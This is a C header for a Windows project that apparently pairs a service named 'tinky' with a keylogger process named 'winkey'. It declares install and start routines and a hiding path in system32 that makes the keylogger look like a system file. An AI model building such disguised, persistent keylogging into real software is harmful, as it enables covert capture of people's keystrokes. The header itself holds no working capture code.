#pragma once

#define UNICODE // Keep ?
#define _UNICODE // Keep ?

#include "winMandatory.h"
#include <windows.h>
#include <iostream>

//#include "unicode.h"

// =============== Magic variables ========== //
#define WINKEY_STOP "Global\\stop_winkey_process"  // NameSpace Global ?
#define SVC_NAME "tinky"
#define KYLG_NAME "winkey"
#define HIDING_PATH "C:\\WINDOWS\\system32\\winkey.exe"
// global {
#define NO_NAME NULL
#define NONE 0
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
#pragma pack(1)
typedef struct tinky {
	// install {
	SC_HANDLE	HServiceControlManager;
	SC_HANDLE	HService;
	// }

	// Global {
	char	*winkeyExePath;
	char	*tinkyExePath;
	// }

	// start {
	SERVICE_STATUS			svcStatus;
	SERVICE_STATUS_HANDLE	svcStatusHandle;
	HANDLE					tinkyStopEventHandle;
	HANDLE					winkeyStopEventHandle;
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInfo;
	// }
}	tinky_t;
#pragma pack()
// ============================================= //

// =============== createService.cpp ===============//
int install(void);
// =============== start.cpp =============== //
int start(void);
// =============== service control managed =============== //
int startedBySCM(void);